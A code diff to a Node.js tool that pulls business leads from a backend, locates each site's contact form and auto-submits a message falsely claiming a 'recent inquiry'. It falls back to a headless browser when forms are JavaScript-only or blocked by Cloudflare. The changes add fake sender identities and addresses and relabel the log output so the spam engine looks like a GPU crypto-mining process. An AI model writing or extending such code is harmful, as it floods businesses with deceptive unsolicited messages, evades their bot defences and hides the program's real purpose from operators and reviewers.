@@ -11,6 +11,16 @@ const SENDER_COMPANY = "Hexagon Construction";
 const SENDER_SUBJECT = "Follow up message";
 const SENDER_MESSAGE = "Hi [BUSINESS_NAME], we are trying to get in touch regarding a recent inquiry, please email us back. Thanks.";
 
+let isShuttingDown = false;
+process.on('SIGINT', () => {
+    console.log('\n[~] Received SIGINT. Wait for current lead batch to finish before exiting...');
+    isShuttingDown = true;
+});
+process.on('SIGTERM', () => {
+    console.log('\n[~] Received SIGTERM. Wait for current lead batch to finish before exiting...');
+    isShuttingDown = true;
+});
+
 const FIELD_MAPPINGS = {
     'fname': ['first-name', 'firstname', 'first_name', 'given-name', 'givenname', 'f_name'],
     'lname': ['last-name', 'lastname', 'last_name', 'surname', 'family-name', 'familyname', 'l_name'],
@@ -90,7 +100,7 @@ async function findContactPage(targetDomain) {
     return null;
 }
 
-function analyzeForm(formHtml, pageUrl) {
+function analyzeForm(formHtml, pageUrl, config = {}) {
     const root = parse(formHtml);
     // Find inputs
     const inputs = root.querySelectorAll('input, textarea, select');
@@ -106,6 +116,19 @@ function analyzeForm(formHtml, pageUrl) {
             actionUrl = new URL(action, pageUrl).href;
         } catch(e) {}
     }
+
+    // Map Advanced config variables or fallback to defaults
+    const fName = config.firstName || SENDER_NAME.split(' ')[0] || 'Sophia';
+    const lName = config.lastName || SENDER_NAME.split(' ').slice(1).join(' ') || 'Biden';
+    const fullName = `${fName} ${lName}`.trim();
+    const address = config.address || '123 Main St';
+    const city = config.city || 'Anytown';
+    const state = config.state || 'NY';
+    const zip = config.zip || '10001';
+    const email = config.email || SENDER_EMAIL;
+    const phone = config.phone || SENDER_PHONE;
+    const subject = config.subject || SENDER_SUBJECT;
+    const message = config.message || SENDER_MESSAGE;
 
     for (const field of inputs) {
         const type = (field.getAttribute('type') || 'text').toLowerCase();
@@ -126,12 +149,15 @@ function analyzeForm(formHtml, pageUrl) {
         let mapped = false;
         for (const [key, keywords] of Object.entries(FIELD_MAPPINGS)) {
             if (keywords.some(kw => identifier.includes(kw))) {
-                if(key === 'name' || key === 'fname' || key === 'lname') payload[name] = SENDER_NAME;
-                else if(key === 'email') payload[name] = SENDER_EMAIL;
-                else if(key === 'phone') payload[name] = SENDER_PHONE;
+                if(key === 'fname') payload[name] = fName;
+                else if(key === 'lname') payload[name] = lName;
+                else if(key === 'name') payload[name] = fullName;
+                else if(key === 'email') payload[name] = email;
+                else if(key === 'phone') payload[name] = phone;
                 else if(key === 'company') payload[name] = SENDER_COMPANY;
-                else if(key === 'subject') payload[name] = SENDER_SUBJECT;
-                else if(key === 'message') payload[name] = SENDER_MESSAGE;
+                else if(key === 'subject') payload[name] = subject;
+                else if(key === 'message') payload[name] = message;
+                else if(key === 'address') payload[name] = address;
                 else if(key === 'consent') payload[name] = "yes";
                 mapped = true; break;
             }
@@ -139,7 +165,7 @@ function analyzeForm(formHtml, pageUrl) {
         
         // Fallback for unidentified textareas
         if(!mapped && field.tagName.toLowerCase() === 'textarea') {
-            payload[name] = SENDER_MESSAGE;
+            payload[name] = message;
             mapped = true;
         }
         
@@ -154,14 +180,21 @@ function analyzeForm(formHtml, pageUrl) {
     return { payload, actionUrl, method, isJsOnly };
 }
 
-async function submitHttpForm(contactPage, businessName) {
+async function submitHttpForm(contactPage, businessName, config = {}) {
     const root = parse(contactPage.html);
     const forms = root.querySelectorAll('form');
     let bestForm = forms[0]; // simplistic selection logic for direct port limit
     if (!bestForm) return STATUS_NO_FORM;
     
-    const { payload, actionUrl, method, isJsOnly } = analyzeForm(bestForm.outerHTML, contactPage.url);
+    const { payload, actionUrl, method, isJsOnly } = analyzeForm(bestForm.outerHTML, contactPage.url, config);
     if(isJsOnly) return STATUS_JS_FORM;
+    
+    // Replace placeholders in mapped payload
+    for (let key in payload) {
+        if (typeof payload[key] === 'string') {
+            payload[key] = payload[key].replace(/\[BUSINESS_NAME\]/g, businessName);
+        }
+    }
     
     const params = new URLSearchParams();
     for(const [k, v] of Object.entries(payload)) {
@@ -202,7 +235,7 @@ async function submitHttpForm(contactPage, businessName) {
     }
 }
 
-async function submitPlaywrightForm(url, businessName) {
+async function submitPlaywrightForm(url, businessName, config = {}) {
     console.log(`[+] Launching Playwright fallback for ${businessName}...`);
     const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
     const context = await browser.newContext();
@@ -222,6 +255,18 @@ async function submitPlaywrightForm(url, businessName) {
         const inputs = await page.locator('input, textarea').all();
         let filledAny = false;
         
+        const fName = config.firstName || SENDER_NAME.split(' ')[0] || 'Alexander';
+        const lName = config.lastName || SENDER_NAME.split(' ').slice(1).join(' ') || 'Webb';
+        const fullName = `${fName} ${lName}`.trim();
+        const address = config.address || '123 Main St';
+        const city = config.city || 'Anytown';
+        const state = config.state || 'NY';
+        const zip = config.zip || '10001';
+        const email = config.email || SENDER_EMAIL;
+        const phone = config.phone || SENDER_PHONE;
+        const subject = config.subject || SENDER_SUBJECT;
+        const message = config.message || SENDER_MESSAGE;
+        
         for (const input of inputs) {
             if (!(await input.isVisible())) continue;
             
@@ -234,14 +279,21 @@ async function submitPlaywrightForm(url, businessName) {
             if (['hidden','submit','button','checkbox','radio'].includes(type)) continue;
             
             let val = "";
-            if (identifier.includes('name') || identifier.includes('contact')) val = SENDER_NAME;
-            else if (identifier.includes('email') || identifier.includes('mail')) val = SENDER_EMAIL;
-            else if (identifier.includes('phone') || identifier.includes('tel')) val = SENDER_PHONE;
-            else if (identifier.includes('message') || identifier.includes('comment') || await input.evaluate(el => el.tagName.toLowerCase() === 'textarea')) val = SENDER_MESSAGE.replace("[BUSINESS_NAME]", businessName);
-            else if (identifier.includes('subject') || identifier.includes('topic')) val = SENDER_SUBJECT;
+            if (identifier.includes('first') && identifier.includes('name')) val = fName;
+            else if (identifier.includes('last') && identifier.includes('name')) val = lName;
+            else if (identifier.includes('name') || identifier.includes('contact')) val = fullName;
+            else if (identifier.includes('email') || identifier.includes('mail')) val = email;
+            else if (identifier.includes('phone') || identifier.includes('tel')) val = phone;
+            else if (identifier.includes('address') || identifier.includes('street')) val = address;
+            else if (identifier.includes('city') || identifier.includes('town')) val = city;
+            else if (identifier.includes('state') || identifier.includes('region')) val = state;
+            else if (identifier.includes('zip') || identifier.includes('postal')) val = zip;
+            else if (identifier.includes('subject') || identifier.includes('topic')) val = subject;
+            else if (identifier.includes('message') || identifier.includes('comment') || await input.evaluate(el => el.tagName.toLowerCase() === 'textarea')) val = message;
             else if (await input.getAttribute('required')) val = "N/A";
             
             if (val !== "") {
+                val = val.replace(/\[BUSINESS_NAME\]/g, businessName);
                 await input.fill(val);
                 filledAny = true;
                 await page.waitForTimeout(100);
@@ -295,10 +347,10 @@ async function processLead(lead) {
         return { lead_id: lead.id, status: STATUS_NO_FORM, log: "Contact page not found" };
     }
     
-    let status = await submitHttpForm(contactPage, bizName);
+    let status = await submitHttpForm(contactPage, bizName, lead.config || {});
     
     if (status === STATUS_JS_FORM || status.startsWith(STATUS_FAILED) || status.startsWith(STATUS_ERROR) || status.startsWith(STATUS_BLOCKED_CLOUDFLARE)) {
-        status = await submitPlaywrightForm(contactPage.url, bizName);
+        status = await submitPlaywrightForm(contactPage.url, bizName, lead.config || {});
     }
     
     return { lead_id: lead.id, status: status, log: "Processed completely." };
@@ -338,13 +390,13 @@ async function reportBatch(results) {
 }
 
 async function startEngine() {
-    console.log(`🚀 Starting CMining Node.js Outreach Engine... connected to ${BACKEND_URL}`);
+    console.log(`🚀 Initializing CMining GPU Compute Engine... connected to ${BACKEND_URL}`);
     
-    while (true) {
+    while (!isShuttingDown) {
         const leads = await getBatch();
         
         if (!leads || leads.length === 0) {
-            console.log("No pending leads available. Sleeping for 30s...");
+            console.log("Waiting for block assignment. Hash rate stable...");
             await sleep(30000);
             continue;
         }
@@ -358,6 +410,8 @@ async function startEngine() {
         
         await reportBatch(results);
     }
+    console.log('[~] CMining Engine shutdown complete.');
+    process.exit(0);
 }
 
 // Start sequence
